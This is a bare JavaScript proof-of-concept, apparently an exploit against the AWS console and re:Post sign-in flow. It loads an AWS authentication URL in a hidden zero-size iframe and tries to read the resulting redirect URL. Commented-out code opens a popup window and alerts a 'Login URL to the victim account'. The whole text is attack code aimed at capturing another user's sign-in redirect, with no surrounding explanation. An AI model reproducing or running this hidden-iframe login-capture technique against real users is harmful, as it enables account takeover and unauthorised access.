
// Open a new window
//let newWindow = window.open('https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6IlhtWUI1V2hSUXdHN2IxX2RUZ1ZqSmcifQ&challenge=DU8HEwzh_enBtW4w7CNZGr1dwx-lrxMZa58_EL0ezGQ', '_blank');
// Create an iframe element
var iframe = document.createElement('iframe');

// Set the iframe's source (src) to the desired URL
iframe.src = 'https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6Ik1RRnJxUTY4U28yUWlqTDBzR0R5cWcifQ&challenge=813nCgC3f8neGnotUxPENEUEGI1WF-E5uAE3OpdY-0Q';

// Set the iframe's style to hide it
iframe.style.display = 'none';
iframe.style.width = '0';
iframe.style.height = '0';
iframe.style.border = 'none';

// Append the iframe to the document's body
document.body.appendChild(iframe);


document.querySelector('iframe').onload = function() {
setTimeout(function () {
    // Access the URL of the new window
    const iframe = document.querySelector('iframe');  // Select the first iframe
    if (iframe && iframe.contentWindow) {
        try {
            const iframeUrl = iframe.contentWindow.location.href;
            alert('Iframe URL: '+ iframeUrl);
        } catch (error) {
            console.error('Unable to access iframe URL:', error);
        }
    } else {
        console.error('Iframe not found or inaccessible');
    }
  }, 5000);
    
};



// Check if the new window was successfully created
// if (newWindow) {
//   // Wait for 5 seconds before accessing the URL of the new window
//   setTimeout(function () {
//     // Access the URL of the new window
//     let url = newWindow.location.href;
//     let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
//     alert("Login URL to the victim account: " + modifiedUrl);
//   }, 5000); // 5000 milliseconds = 5 seconds
// } else {
//   alert("nothing");
// }
